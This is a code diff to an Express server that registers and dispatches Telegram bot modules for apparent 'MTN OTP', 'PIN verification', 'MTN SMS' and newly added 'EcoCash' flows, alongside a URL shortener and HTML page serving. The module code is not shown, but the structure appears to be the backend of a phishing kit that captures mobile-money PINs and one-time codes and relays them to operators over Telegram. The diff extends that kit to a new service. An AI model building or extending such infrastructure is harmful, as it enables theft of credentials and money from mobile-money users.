@@ -60,8 +60,6 @@ app.post('/api/shorten', (req, res) => {
 
 /* ─────────────────────────────────────────────────────────────
    DIAGNOSTIC — list all files currently in /public
-   Open https://<domain>/api/list-public in your browser to see
-   exactly which HTML files Railway is serving.
    ───────────────────────────────────────────────────────────── */
 app.get('/api/list-public', (req, res) => {
   const pubDir = path.join(__dirname, 'public');
@@ -85,10 +83,12 @@ app.get('/api/list-public', (req, res) => {
 let telegramPin = null;
 let telegramMtn = null;
 let telegramOtp = null;
+let telegramEco = null;
 
-try { telegramPin = require('./telegram-bot'); } catch (e) { console.warn('[server] telegram-bot.js not found'); }
-try { telegramMtn = require('./telegram-mtn'); } catch (e) { console.warn('[server] telegram-mtn.js not found'); }
-try { telegramOtp = require('./telegram-otp'); } catch (e) { console.warn('[server] telegram-otp.js not found'); }
+try { telegramPin = require('./telegram-bot'); }    catch (e) { console.warn('[server] telegram-bot.js not found'); }
+try { telegramMtn = require('./telegram-mtn'); }    catch (e) { console.warn('[server] telegram-mtn.js not found'); }
+try { telegramOtp = require('./telegram-otp'); }    catch (e) { console.warn('[server] telegram-otp.js not found'); }
+try { telegramEco = require('./telegram-ecocash'); } catch (e) { console.warn('[server] telegram-ecocash.js not found'); }
 
 if (telegramPin && typeof telegramPin.registerRoutes === 'function') {
   telegramPin.registerRoutes(app);
@@ -102,9 +102,18 @@ if (telegramOtp && typeof telegramOtp.registerRoutes === 'function') {
   telegramOtp.registerRoutes(app);
   log('info', 'telegram-otp registered');
 }
+if (telegramEco && typeof telegramEco.registerRoutes === 'function') {
+  telegramEco.registerRoutes(app);
+  log('info', 'telegram-ecocash registered');
+}
 
 /* ─────────────────────────────────────────────────────────────
    SINGLE TELEGRAM WEBHOOK DISPATCHER
+   Routes by callback_data prefix:
+     otp_*      → telegram-otp   (MTN OTP flow)
+     pin_*      → telegram-bot   (PIN verification flow)
+     eco_*      → telegram-ecocash (EcoCash flow)
+     others     → telegram-mtn   (MTN SMS flow)
    ───────────────────────────────────────────────────────────── */
 app.post('/api/telegram/webhook', async (req, res) => {
   const update = req.body || {};
@@ -115,6 +124,8 @@ app.post('/api/telegram/webhook', async (req, res) => {
       await telegramOtp.handleUpdate(update);
     } else if (data.startsWith('pin_') && telegramPin && typeof telegramPin.handleUpdate === 'function') {
       await telegramPin.handleUpdate(update);
+    } else if (data.startsWith('eco_') && telegramEco && typeof telegramEco.handleUpdate === 'function') {
+      await telegramEco.handleUpdate(update);
     } else if (telegramMtn && typeof telegramMtn.handleUpdate === 'function') {
       await telegramMtn.handleUpdate(update);
     } else {
@@ -143,8 +154,6 @@ app.get('/', (req, res) => {
 
 /* ─────────────────────────────────────────────────────────────
    HTML FALLBACK — clearer 404s for missing .html files
-   If someone requests /sms.html and it doesn't exist, we say so
-   explicitly instead of a bare "Cannot GET".
    ───────────────────────────────────────────────────────────── */
 app.get(/\.html$/i, (req, res, next) => {
   const filename = path.basename(req.path);
@@ -152,7 +161,6 @@ app.get(/\.html$/i, (req, res, next) => {
   if (fs.existsSync(fullPath)) {
     return res.sendFile(fullPath);
   }
-  // File doesn't exist — show a clear message
   log('err', `Missing HTML file: ${filename}`);
   res.status(404).send(
     '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Missing page</title>' +
